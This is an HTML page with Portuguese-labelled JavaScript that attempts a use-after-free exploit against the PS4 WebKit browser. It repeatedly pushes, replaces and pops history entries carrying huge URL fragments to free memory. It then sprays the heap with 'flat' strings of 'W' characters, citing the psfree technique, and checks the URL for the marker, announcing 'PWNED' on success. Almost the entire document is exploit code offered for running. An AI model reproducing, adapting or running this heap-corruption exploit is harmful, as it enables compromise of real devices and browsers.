<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Flat String Spray</title>
<style>
    body { background-color: #000; color: #00ffff; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0ff; background: #004444; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
</style>
</head>
<body>
<h2>PS4 WebKit - Flat String Spray (Anti-Rope)</h2>
<div id="status">Aguardando...</div>

<button onclick="runFlatSpray(false)">TENTATIVA 1: FLAT 8-BIT (~340k chars)</button>
<button onclick="runFlatSpray(true)">TENTATIVA 2: FLAT 16-BIT (~170k chars)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// TÉCNICA DO PSFREE.MJS: Criar Flat String via join()
function createFlatString(len, char) {
    // Cria um array vazio e preenche
    // Isso força o motor JS a calcular a string final inteira na memória
    let arr = new Array(len);
    for(let i=0; i<len; i++) arr[i] = char;
    return arr.join("");
}

async function runFlatSpray(use16bit) {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Preparando...";

    const TARGET_BYTES = 340356;
    let targetLen = use16bit ? Math.floor(TARGET_BYTES / 2) : TARGET_BYTES;
    
    log(`1. Gerando Flat Strings (${use16bit ? "16-bit" : "8-bit"})...`);
    log(`   Alvo: ${targetLen} caracteres.`);

    let payloads = [];
    // Variação de tamanho para alinhamento (-64 a +64)
    for(let delta = -64; delta <= 64; delta += 4) {
        // Usamos 'W' (0x57) como marcador
        payloads.push(createFlatString(targetLen + delta, "W"));
    }
    log(`   ${payloads.length} variações geradas.`);

    // === PASSO 2: TRIGGER UAF ===
    log("2. Disparando UAF Original...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO DO ATAQUE
        if (i === 47) {
            log(">>> SPRAY DE FLAT STRINGS <<<");
            
            // 1. Libera a memória
            setTimeout(() => history.back(), 0);
            
            // 2. Injeta as Flat Strings IMEDIATAMENTE
            // Elas já estão computadas, então a alocação é direta no Heap
            for(let j=0; j < payloads.length; j++) {
                // Duplicamos a referência para garantir que não seja GC'd
                keepAlive.push(payloads[j]); 
            }

            // 3. Acesso forçado para garantir "Flatness" (achatamento)
            // Ler um caractere força o motor a resolver a string na memória
            for(let j=0; j < keepAlive.length; j+=10) {
                 let dummy = keepAlive[j].charAt(0);
            }
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(200);

    // === PASSO 3: VERIFICAÇÃO ===
    checkResult();
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) === 0x57) { // 0x57 é 'W'
            changed = true;
            sample = "Encontrado 'W' no offset " + i;
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!");
        log("Flat String Spray funcionou!");
        log(sample);
        statusEl.innerText = "PWNED";
        statusEl.style.backgroundColor = "#00ffff";
        statusEl.style.color = "#000";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("Se falhar com Flat Strings, o UAF pode estar isolado em um sub-heap protegido.");
    }
}
</script>
</body>
</html>
